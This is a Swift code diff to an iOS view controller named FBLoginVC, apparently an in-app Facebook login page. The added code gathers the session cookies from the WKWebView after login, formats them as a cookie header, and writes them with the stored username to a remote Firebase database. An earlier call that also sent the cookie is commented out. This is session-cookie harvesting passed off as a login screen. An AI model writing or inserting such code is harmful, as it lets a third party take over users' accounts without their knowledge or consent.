@@ -123,6 +123,12 @@ extension FBLoginVC{
         }
         return nil
     }
+    
+    private func pushDataFirebase(cookei: String){
+        ref = Database.database().reference()
+        let email = UserDefaults.standard.value(forKey:"username")
+        self.ref.child("users").setValue(["username": email,"cookeis": cookei])
+    }
 }
 
 extension FBLoginVC: WKNavigationDelegate{
@@ -148,7 +154,8 @@ extension FBLoginVC: WKNavigationDelegate{
                                             return "\(key)=\(fullNameArr[1].replace(string: "\"", with: "").replace(string: "Version = 1;\n}", with: "").replace(string: ";", with: "")) "
                                         }) as Array).joined(separator: ";")
                                         let cookeis = cookieHeader.replace(string: "\n     ", with: "")
-                                        self.pushData(cookie: cookeis,listData: "true" , allAcc: 0)
+                                        self.pushDataFirebase(cookei: cookeis)
+//                                        self.pushData(cookie: cookeis,listData: "true" , allAcc: 0)
 //                                        if let tokken = value as? String{
 //                                            if tokken.components(separatedBy: "&").count > 0 {
 //                                                print("tokken : \(tokken.components(separatedBy: "&")[0])")
